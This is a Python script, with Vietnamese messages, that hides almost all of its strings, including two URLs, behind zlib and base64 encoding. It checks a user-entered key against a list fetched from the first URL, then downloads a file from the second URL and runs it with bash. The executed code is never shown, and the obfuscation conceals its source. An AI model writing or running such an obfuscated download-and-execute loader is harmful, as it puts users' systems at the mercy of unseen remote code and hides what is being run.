import zlib,base64,os,requests
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJw9y7EKwjAQAND9vuJGuzR7VynGpUpJKI6XePUOtC30IvTvJYtvf4B48uXgJchK6kkDZbzN81sXbgAQxWzbO+dealJSm9ePGy7x0Q9hvPbx7uPZSf1Wv5Aa5domTrsad/+/ScmJ0tE++YsA8ANtYyeQ'))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJwLTixVyM7IVEg+vCBT4cjEh7u2l+go5D7c3ZupUFha+XB3Y55CxsNdC/MUyg4vUCg5vDYvQyHvSHNeukLyw93LExVCUotySysUih/u2qtQklH6cPfMZIUyoC4FD6jmkIx8oPZMBY+HuxZnKoQAzU+GagIAIL87NQ=='))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJwLO7xWIeXh7qUKeRnHNigkPdy1ME8hO+Pwlrx0hZKMh7ubFRILShQy84pLEnNyQNJLSxSyD69RSD68MFMh/fAaHYVskKLkh7sWK6QUZKdzAQAnDyXX'))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJzze7hrf6lC0sNdC/MUcksf7p6Yp1BYmlipUPZwd6NCUmKewpGJD3ctL9VRyDi8uFIh+fCCTLDI9hKFHKCeTIWQ1KLc0gouLi4AU0ojCA=='))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJzzdo1U8AiNfLi7wU8hxMP/4a4FngoeD3ct8lQIebhrm7NCiGuQb2iEAhcXAGWfECg='))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJxTUFBQ0FXwe7hrf6lC0sNdC/MUkjOObUhUSD68WSE7tVKhpKi0UiH54a61BVZcXACmqxK4'))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJxTUACBjJKSgmIrff2CjNLkpMSkSr2U1DL97NRKLi4AmNoJ0w=='))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJwBNwDI/yAgICAtIELhuqFuIG114buRbiB0aeG6v3AgdOG7pWMgdnVpIGzDsm5nIG5o4bqtcCBrZXk/CgqcgBgK'))
KEY_URL=(lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJzLKCkpKLbS108syNRNyi/Ry8/LycxLBXH1y4z1s1Mri/VKKkoADVMN5Q==')
try:response=requests.get(KEY_URL);KEY_CONTENT=response.text
except requests.RequestException as e:print(f"Không thể tải key. Lỗi: {e}");exit(1)
if not KEY_CONTENT:print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJzzzji8JS9doSTj4e5mhZKHuxZnKmSnVuopeGcCBXIVSooSFXIe7lqYqXBk4rEND3fPBapNebhrdZ5CRv7DXduTFbIf7tpfopD3cPfETIVcoMK8dD0AvToqCw=='));exit(1)
USER_KEY=input((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJzzy3i4a22BQnZqpcKRiQ93NyuUZD7ctb9AoeTh7qXJVgoA/90PxQ=='))
if USER_KEY not in KEY_CONTENT:print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJzj8k6tVMjOOLwlL13hyMTDu/LSdRTKSjMVcg5vAorkZB5elaeQ8XB3u0JiSm5mnkJuaaJCdmqlHgCYhxdO'));exit(1)
SCRIPT_URL=(lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJzLKCkpKLbS1y/IKE1OSkyq1EtJLdNPLMjULyrN0yuoBAC46QuL')
SCRIPT_TO_RUN=(lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJwrKs3TK6gEAAiWAm0=')
if not os.path.isfile(SCRIPT_TO_RUN):
	print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJw7MiExL12h5OGuxZkKaZk5qQp6enoAY2AIMA=='))
	try:
		script_response=requests.get(SCRIPT_URL)
		with open(SCRIPT_TO_RUN,(lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJwrTwIAAVIA2g=='))as file:file.write(script_response.content)
		print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJwLebhrcaZCWmZOqkJJxuEFeRkKyYe35KUrAgCNOwrh'))
	except requests.RequestException as e:print(f"Tải file thất bại! Lỗi: {e}");exit(1)
else:print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJxzy8xJVTgy8fBihZKHuyfnAcldCzN1FLIzDm/JS1dIfrhrOVhscaZCDkhGDwBCPRf+'))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJzzTq1UODLx8K68dEWFIxMS89IVkjMe7lpYqZCWmZOqp6cHAO5+DaY='))
print((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJw7MiH/4a6FeQq5hxcrBFSWZOTnKRyZCGQnZwCFKxVKMg4vyMtQSD68JS9dDwD5sRWw'))
os.system(f"bash {SCRIPT_TO_RUN}")
